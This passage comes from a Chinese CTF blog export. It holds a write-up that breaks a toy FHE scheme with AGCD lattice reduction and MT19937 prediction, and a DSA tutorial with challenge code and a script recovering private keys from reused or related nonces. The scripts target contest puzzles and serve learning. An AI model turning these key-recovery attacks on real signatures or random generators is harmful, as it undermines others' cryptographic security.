class="keyword">for</span> m <span class="keyword">in</span> msg:</span><br><span class="line">            tmp = <span class="number">0</span></span><br><span class="line">            shuffle_base = urandom(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> shuffle_base:</span><br><span class="line">                x,y = <span class="built_in">divmod</span>(i,<span class="number">16</span>)</span><br><span class="line">                tmp += x*self.pubkeys[y] + y*self.pubkeys[x]</span><br><span class="line">            result.append(tmp + m)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>沟槽的MT19937还在追我，但是先来看看这个FHE,重点看self.pubkeys.append(self.p * getrandint(177) + (getrandint(17) &lt;&lt; 8))，公钥组的生成p$*k_i$&#x3D;p$*a_i$+b$_i$&lt;&lt;8,对移位操作比较熟悉不难发现左移8位相当于乘上256，即p$*k_i$&#x3D;p$*a_i$+b$_i$*256，那很明显就是一个agcd的问题，把加号后面的看作一个整体就行。首先agcd构造格求出p。结果可以简化为<code>result=p*A+256*B+m</code>，分析得出<code>m=result%p%256</code>，那么流程就很清晰了，使用agcd解密得到生成随机数的后19968位，随后用MT19937在已知后19968位的前提下预测前32位。然后用自定义的加解密方式还原m。</p>
<p>agcd部分ref：<a href="https://hasegawaazusa.github.io/agcd-note.html#fhe-%E5%85%A8%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86">AGCD近似最大公约数问题 | 独奏の小屋</a></p>
<p>MT19937逆向预测其实就是逆向其<code>twist()</code>函数，回头开篇文章专门写一下关于MT19937的，最近碰到的这类题蛮多了。</p>
<p>ref：<a href="https://seandictionary.top/nctf-2024/">NCTF 2024 - SeanDictionary | 折腾日记</a></p>
<p>记录一下，预测的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">MT19937_re</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造目标向量R</span></span><br><span class="line">        R = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> state:</span><br><span class="line">            R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line">        R = vector(GF(<span class="number">2</span>), R)</span><br><span class="line">        s = L.solve_left(R)  <span class="comment"># 这里可能会抛出异常</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将解转换为二进制字符串</span></span><br><span class="line">        init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, s)))</span><br><span class="line">        state = []</span><br><span class="line">        <span class="comment"># 将解重新分割成624个32位整数</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            state.append(<span class="built_in">int</span>(init[<span class="number">32</span> * i:<span class="number">32</span> * i + <span class="number">32</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建新的RNG并设置恢复出的状态</span></span><br><span class="line">        RNG1 = Random()</span><br><span class="line">        RNG1.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(state + [<span class="number">624</span>]), <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> RNG1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_a_row</span>(<span class="params">RNG</span>):</span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19968</span> // <span class="number">32</span>):</span><br><span class="line">        tmp = RNG.getrandbits(<span class="number">32</span>)</span><br><span class="line">        row = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(tmp)[<span class="number">2</span>:].zfill(<span class="number">32</span>))) + row</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造线性方程组的矩阵</span></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">19968</span>):</span><br><span class="line">    state = [<span class="number">0</span>] * <span class="number">624</span>  <span class="comment"># MT19937使用624个32位整数作为状态</span></span><br><span class="line">    <span class="comment"># 构造一个只有一位为1,其他都为0的序列</span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span> * i + <span class="string">&quot;1&quot;</span> * <span class="number">1</span> + <span class="string">&quot;0&quot;</span> * (<span class="number">19968</span> - <span class="number">1</span> - i)</span><br><span class="line">    <span class="comment"># 将这个序列分成624段,每段32位,转换为整数</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span> * j:<span class="number">32</span> * j + <span class="number">32</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    RNG = Random()</span><br><span class="line">    RNG.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(state + [<span class="number">624</span>]), <span class="literal">None</span>))</span><br><span class="line">    L.append(construct_a_row(RNG))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将L转换为GF(2)上的矩阵（二进制域）</span></span><br><span class="line">L = Matrix(GF(<span class="number">2</span>), L)</span><br><span class="line"><span class="built_in">print</span>(L.nrows(), L.ncols())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AGCD</span>(<span class="params">xs, rho</span>):</span><br><span class="line">    <span class="comment"># reference:https://hasegawaazusa.github.io/agcd-note.html</span></span><br><span class="line">    k = <span class="built_in">len</span>(xs)</span><br><span class="line">    A = ZZ(<span class="built_in">pow</span>(<span class="number">2</span>, rho + <span class="number">1</span>))</span><br><span class="line">    B = matrix(xs[<span class="number">1</span>:])</span><br><span class="line">    C = matrix.diagonal([-xs[<span class="number">0</span>]] * (k - <span class="number">1</span>))</span><br><span class="line">    M = matrix.block([[A, B], [ZZ(<span class="number">0</span>), C]])</span><br><span class="line">    L = M.LLL()</span><br><span class="line">    q0 = ZZ(L[<span class="number">0</span>, <span class="number">0</span>] / A).<span class="built_in">abs</span>()</span><br><span class="line">    e0 = ZZ(xs[<span class="number">0</span>] % q0)</span><br><span class="line">    p = ZZ((xs[<span class="number">0</span>] - e0) / q0)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MT19937_re</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造目标向量R</span></span><br><span class="line">        R = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> state:</span><br><span class="line">            R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line">        R = vector(GF(<span class="number">2</span>), R)</span><br><span class="line">        s = L.solve_left(R)  <span class="comment"># 这里可能会抛出异常</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将解转换为二进制字符串</span></span><br><span class="line">        init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, s)))</span><br><span class="line">        state = []</span><br><span class="line">        <span class="comment"># 将解重新分割成624个32位整数</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            state.append(<span class="built_in">int</span>(init[<span class="number">32</span> * i:<span class="number">32</span> * i + <span class="number">32</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建新的RNG并设置恢复出的状态</span></span><br><span class="line">        RNG1 = Random()</span><br><span class="line">        RNG1.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(state + [<span class="number">624</span>]), <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> RNG1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = long_to_bytes(<span class="number">0xb34b04966970e822ff73a6d1d1e6f2a3778e38330d8b8660f66f713d9fd9a536dde82daeb1c2d6e8d8dbd7c8f80178a2</span>)</span><br><span class="line">Keys = json.loads(<span class="built_in">open</span>(<span class="string">r&quot;sign1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">string = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30000</span> // <span class="number">2500</span>):</span><br><span class="line">    xs = Keys[i * <span class="number">2500</span>:(i + <span class="number">1</span>) * <span class="number">2500</span>]</span><br><span class="line">    p = AGCD(xs[:<span class="number">40</span>], <span class="number">23</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]found p:<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    es = [(x % p) % <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">    RNG = MT19937_re(es[:-<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]reverse MT19937&quot;</span>)</span><br><span class="line">    heads = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> long_to_bytes(RNG.getrandbits(<span class="number">20000</span>))[:<span class="number">4</span>]]</span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)[::-<span class="number">1</span>]:</span><br><span class="line">        tmp = (<span class="built_in">pow</span>(heads[i], -<span class="number">1</span>, <span class="number">0x101</span>) * es[-<span class="number">4</span>:][i]) % <span class="number">0x101</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">int</span>(tmp).bit_length() &lt;= <span class="number">2</span></span><br><span class="line">        m = (m &lt;&lt; <span class="number">2</span>) + tmp</span><br><span class="line">    m = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    string += m</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]get:<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]string:<span class="subst">&#123;string&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]flag: <span class="subst">&#123;AES.new(md5(string).digest(), AES.MODE_ECB).decrypt(ciphertext)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2025复现</title>
    <url>/2025/04/29/ACTF2025%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>owo</p>
]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>DSA签名</title>
    <url>/2024/08/17/DSA%E7%AD%BE%E5%90%8D/</url>
    <content><![CDATA[<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><span id="more"></span>

<h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><ol>
<li>选择一个合适的哈希函数，目前一般选择 SHA1，当前也可以选择强度更高的哈希函数 H。</li>
<li>^选择密钥的长度^ L 和 N，这两个值决定了签名的安全程度。在最初的 DSS（<strong>Digital Signature Standard</strong> ）中建议 L 必须为 64 的倍数，并且512≤L≤1024 ，当然，也可以更大。N 必须大小必须不大于哈希函数 H 输出的长度。</li>
<li>选择 N 比特的素数 q。</li>
<li>选择 L 比特的素数 p，使得 p-1 是 q 的倍数。</li>
<li>选择满足 g^k^≡1modp的最小正整数 k 为 q 的 g，即在模 p 的背景下，ord(g)&#x3D;q 的 g。即 g 在模 p 的意义下，其指数次幂可以生成具有 q 个元素的子群。这里，我们可以通过计算g&#x3D;h$$\frac{p-1}{q}$$modp 来得到 g，其中1&lt;h&lt;p−1 。</li>
<li>选择私钥 x，0&lt;x&lt;q ，计算y≡g^x^modp 。</li>
</ol>
<p>公钥为 (p,q,g,y)，私钥为 (x)。</p>
<h2 id="进行签名"><a href="#进行签名" class="headerlink" title="进行签名"></a>进行签名</h2><ol>
<li>选择随机整数数 k 作为临时密钥，0&lt;k&lt;q0&lt;k&lt;q 。</li>
<li>计算r≡(g^k^modp)modq</li>
<li>计算s≡(H(m)+xr)k^−1^modq</li>
</ol>
<p>签名结果为 (r,s)。H(m)为明文的哈希值。</p>
<h2 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h2><ol>
<li>计算辅助值，w&#x3D;s^−1^modq</li>
<li>计算辅助值，u1&#x3D;H(m)wmodq</li>
<li>计算辅助值，u2&#x3D;rwmodq</li>
<li>计算v&#x3D;(g^u1^y^u2^modp)modq</li>
<li>如果 v 与 r 相等，则校验成功。</li>
</ol>
<h1 id="题型总结"><a href="#题型总结" class="headerlink" title="题型总结"></a>题型总结</h1><h2 id="1，已知随机密钥k"><a href="#1，已知随机密钥k" class="headerlink" title="1，已知随机密钥k"></a>1，已知随机密钥k</h2><p>已知k时，我们就可以根据s≡(H(m)+xr)k^−1^modq 推出x≡r^−1^(ks−H(m))modq，一般这类题的H都会给出。</p>
<h2 id="2，多个签名使用相同密钥k"><a href="#2，多个签名使用相同密钥k" class="headerlink" title="2，多个签名使用相同密钥k"></a>2，多个签名使用相同密钥k</h2><p>举个栗子[]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512,md5</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">message</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(sha512(message).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>():</span><br><span class="line">	q = getPrime(<span class="number">256</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		p = random.getrandbits(<span class="number">2816</span>)*q + <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> isPrime(p):</span><br><span class="line">			<span class="built_in">print</span>(p.bit_length())</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		g = <span class="built_in">pow</span>(random.randrange(<span class="number">1</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)/q, p)</span><br><span class="line">		<span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	x = random.randrange(<span class="number">1</span>, q)</span><br><span class="line">	y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">	pubkey = (p, q, g, y)</span><br><span class="line">	privkey = x</span><br><span class="line">	<span class="keyword">return</span> pubkey, privkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, pubkey, privkey</span>):</span><br><span class="line">	p, q, g, y = pubkey</span><br><span class="line">	x = privkey</span><br><span class="line">	k = <span class="built_in">pow</span>(y, x, g) * random.randrange(<span class="number">1</span>, <span class="number">512</span>) % q</span><br><span class="line">	r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">	s = inverse(k, q) * (<span class="built_in">hash</span>(message) + x * r) % q</span><br><span class="line">	<span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">message, signature, pubkey</span>):</span><br><span class="line">	p, q, g, y = pubkey</span><br><span class="line">	r, s = signature</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; q) <span class="keyword">or</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; s &lt; q):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	w = inverse(s, q)</span><br><span class="line">	u1 = (<span class="built_in">hash</span>(message) * w) % q</span><br><span class="line">	u2 = (r * w) % q</span><br><span class="line">	v = ((<span class="built_in">pow</span>(g, u1, p) * <span class="built_in">pow</span>(y, u2, p)) % p) % q</span><br><span class="line">	<span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line">pubkey, privkey = key_gen()</span><br><span class="line"><span class="built_in">print</span>(pubkey)</span><br><span class="line"></span><br><span class="line">message1 = urandom(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">signature1 = sign(message1, pubkey, privkey)</span><br><span class="line"><span class="built_in">print</span>(message1,signature1)</span><br><span class="line"><span class="built_in">print</span>(verify(message1, signature1, pubkey))</span><br><span class="line"></span><br><span class="line">message2 = urandom(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">signature2 = sign(message2, pubkey, privkey)</span><br><span class="line"><span class="built_in">print</span>(message2,signature2)</span><br><span class="line"><span class="built_in">print</span>(verify(message2, signature2, pubkey))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span>+md5(long_to_bytes(privkey)).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>显然是一个经典的复用k的情况，但是做了一点小小的升级</p>
<p>注意看这一段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, pubkey, privkey</span>):</span><br><span class="line">	p, q, g, y = pubkey</span><br><span class="line">	x = privkey</span><br><span class="line">	k = <span class="built_in">pow</span>(y, x, g) * random.randrange(<span class="number">1</span>, <span class="number">512</span>) % q</span><br><span class="line">	r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">	s = inverse(k, q) * (<span class="built_in">hash</span>(message) + x * r) % q</span><br><span class="line">	<span class="keyword">return</span> r, s</span><br></pre></td></tr></table></figure>

<p>原版dsa的sign中<code>k = pow(y, x, g) % q</code></p>
<p>而此题<code>k = pow(y, x, g) * random.randrange(1, 512) % q</code></p>
<p>乘了一个随机数。(其实可以直接穷举爆出来的)</p>
<p>那么来一点小小的推导吧</p>
<p>两组数据，则有两个表达式，如下<br>k1s1 &#x3D; (H(M1)+xr1) mod q<br>k2s2 &#x3D; (H(M2)+xr2) mod q<br>同时也有<br>k1 &#x3D; (y^x^ mod g * random1) mod q<br>k2 &#x3D; (y^x^ mod g * random2) mod q<br>k1，k2表达式，将随机数移到左边<br>k1 * random1^-1^ &#x3D; （y^x^ mod g) mod q<br>k2 * random2^-1^ &#x3D; （y^x^ mod g) mod q<br>所以得到：k1 * random1^-1^ &#x3D; k2 * random2^-1^<br>此式子缺乏x，需要引入含有x的表达式，ks &#x3D; (H(M)+xr) mod q，两边同时乘以s1s2<br>k1 * random1^-1^ * s1<em>s2 &#x3D; k2 * random2^-1^ * s1</em>s2<br>式子也等价于<br>H(M1)random1^-1^ <em>s2 + xr1</em>random1^-1^ * s2 &#x3D; H(M2)random2^-1^ <em>s1 + xr2</em>random2^-1^ * s1<br>再化简<br>H(M1)random1^-1^ <em>s2 * random2 + xr1</em>random1^-1^ * s2 * random2 &#x3D; H(M2) * s1 + xr2<em>s1<br>移项<br>H(M1)random1^-1^ <em>s2 * random2 - H(M2) * s1 &#x3D; xr2</em>s1  - xr1</em>random1^-1^ * s2 * random2<br>x &#x3D; H(M1)<em>random1^-1^ <em>s2 * random2 - H(M2) * s1 &#x2F; (r2</em>s1 - r1</em>random1^-1^ * s2 * random2)</p>
<p>除法改成乘法的逆即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512,md5</span><br><span class="line"></span><br><span class="line">pubkey = (<span class="number">3297226463037324458008837284498963372649038889390685051849680175016505646001761220109858921624266044035133134135402561235635833428206886888308027772353030767400921078346868377298401213812053250316002033941692272192644613252296579884516731560436501073253924457646558698855484781747029397755111633297587215976579633451933658235385386539518006570069653575146060016811911140614606471930327341368582979836042585406811352236326065292636484550807213756482153084427714549694264685695977531537425682212155553568848666088576932888234659355213664909753781753917401161977762663658097504411914908081677033980915039079517766159760522261279115347385813009437510156898969769563687869495721977265444799585634019880951532080217960456901788918439265788169910062822889580199366417455186595489973000351770200485095008494228829300145039695936946379585625051402553034971207474762463147744467360158847593356030745194143276254949463650698210515569533L</span>,<span class="number">82302835442112137125891403368151249910268706824854786126600390413622302196443L</span>,<span class="number">1156233264299340971106498371495495695225880592354374034142195518472540521911699506391311324676590685365234887170345722135060009885002334748836477169806166169806180231794918961214520698361874839110454610266388341977984902756569838594616255112661600466818870137432772800368859461445854700956291885576855069405183771903076277144927769029433730710613058788277691211698675287829143272152835171859480781061918556840079857761203012054552142555673071865310355331986288606422711525790877591376770834180618492794265362178603111236615495225612101250344421932588038244804199229449738675082560512062564365473035097263889257937140778993389305893378514344032352806521972367991027459721160744835688761657797398841523104074451793557924512992305640697344011520550723893828185707635141404445213445935586965289450282024222064488965878769991566367115153619761583843561579531705057955933288008556165952066173304891391375100346312776539530448611005L</span>,<span class="number">290999623787731812697719691852061290246619413463636312382146969900546384514710782843153962704851916091601679028830866176332331519515156301401537173069908181509028464322647352256632424684809349121024262597006913707483811117644197481959053785475083406472583099140506505071300193356002443007750220524932219191932969202270343323955035291396808472686684787610559114702054784699365490860392737061056233160308943296478540798353134878937088336672928162894332961762277559345860479916248086821117811990391025187125193074059001086441305977133252774698996653122297123447837449168657347308016270030881395674066421144002959751936839166935726200833785132736328859710351871352567511516142170956091885352178579302299634322254818383978585773136692588922976043617337904545396146755609284163743476297772686548475170197605412847689587171522453229055932712714154869989454808561458852031769119489235598402066924082778376081494632258448434048562053L</span>)</span><br><span class="line">p,q,g,y = pubkey</span><br><span class="line"></span><br><span class="line">message1xx = (<span class="string">b&#x27;0234e7971889def7e60348f77db94b7a&#x27;</span>,(<span class="number">10859236269959765735236393779936305217305574331839234502190226708929991582386L</span>,<span class="number">13707557323895695260471053137828523837745895683218331343360027380310980108819L</span>))</span><br><span class="line"></span><br><span class="line">message1 = <span class="string">b&#x27;0234e7971889def7e60348f77db94b7a&#x27;</span></span><br><span class="line">r1 = <span class="number">10859236269959765735236393779936305217305574331839234502190226708929991582386L</span></span><br><span class="line">s1 = <span class="number">13707557323895695260471053137828523837745895683218331343360027380310980108819L</span></span><br><span class="line"></span><br><span class="line">message2 = <span class="string">b&#x27;16c5ac270b72f70319657b4410d985d4&#x27;</span></span><br><span class="line">r2 = <span class="number">41960642246379067640524709416001536058292817319109764317369777224426218746518L</span></span><br><span class="line">s2 = <span class="number">74676725322515593502346275468843411563746982149373670021082686341369076719088L</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">message</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(sha512(message).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, pubkey, privkey,randoms</span>):</span><br><span class="line">        p, q, g, y = pubkey</span><br><span class="line">        x = privkey</span><br><span class="line">        k = <span class="built_in">pow</span>(y,x,g) * randoms</span><br><span class="line">        r = <span class="built_in">pow</span>(g,k,p)%q</span><br><span class="line">        s = inverse(k,q)*(<span class="built_in">hash</span>(message)+x*r)%q</span><br><span class="line">        <span class="keyword">return</span> r,s</span><br><span class="line"></span><br><span class="line">H1 = <span class="built_in">hash</span>(message1)</span><br><span class="line">H2 = <span class="built_in">hash</span>(message2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = H(M1)*random1^-1 *s2 * random2 - H(M2) * s1 / (r2*s1 - r1*random1^-1 * s2 * random2)</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Now attack start...&quot;</span></span><br><span class="line"><span class="keyword">for</span> random2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">512</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Now random2 is:%d\n&quot;</span> % random2</span><br><span class="line">    <span class="keyword">for</span> random1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">512</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Now random1 is:%d&quot;</span> %random1</span><br><span class="line">        random1_inverse = inverse(random1,q)</span><br><span class="line">        x = (H1*random1_inverse*s2*random2-H2*s1) * inverse(r2*s1-r1*random1_inverse*s2*random2,q)%q</span><br><span class="line">        <span class="keyword">if</span> sign(message1,pubkey,x,random1) == message1xx[<span class="number">1</span>]:</span><br><span class="line">            flag = <span class="string">&#x27;flag&#123;&#x27;</span>+md5(long_to_bytes(x)).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Success!&quot;</span></span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然但是随机数好像要爆蛮久……</p>
<h2 id="3，不同次签名使用的k存在线性关系"><a href="#3，不同次签名使用的k存在线性关系" class="headerlink" title="3，不同次签名使用的k存在线性关系"></a>3，不同次签名使用的k存在线性关系</h2><p>找了半天没看到合适的例题，只有拿Dexter佬的水一水捏</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">FLAG = <span class="string">b&#x27;******************&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">FLAG = FLAG[<span class="number">7</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line">p = <span class="number">12521300600879647215212622604478307167614802603722694432672492518732844280050451647647783544918670551333939947202324314036106883627652934658092246151569719841172139651756731975948641752941369320985906043813128667949407263418091261521078015038472125264708315959943830171678415621896727622381651264882655845219115471323352719455064712014904581019529062436850895982568432772820884304927292484611574315452532539622439874476205201585972439739033662281856954069390915294301650596122027017512657387126870291348326594014789938826560641601265413964203409968207292456857314148848395645091850604205535043035332961436498283695843</span></span><br><span class="line">q = <span class="number">89333150710898097819726085329049525002843220030438497258487456281988064920981</span></span><br><span class="line">g = <span class="number">4659169190462665152432024005060362819268084070474399613244522271693166269703240438309526888954293382169994621221386886590606442329876391429681914154130453072540079426475110538234340272617964838185872575922598867083747162403217264242469640383596415974818773608247780785279490355462362699968367544837511541267300331418420849521244364899679912282991493675152166261501255315036943693486335864565853496499243373834189894710718862409646613179068080762011713847012853815796678705445232715083564615906424779193638984542271665075749327914765645357163924702265124479067028868769369414557728443665123548337757950887923116453268</span></span><br><span class="line">x = bytes_to_long(FLAG)</span><br><span class="line">y = powmod(g, x, p)</span><br><span class="line"></span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = x</span><br><span class="line"></span><br><span class="line">nonce = getPrime(<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 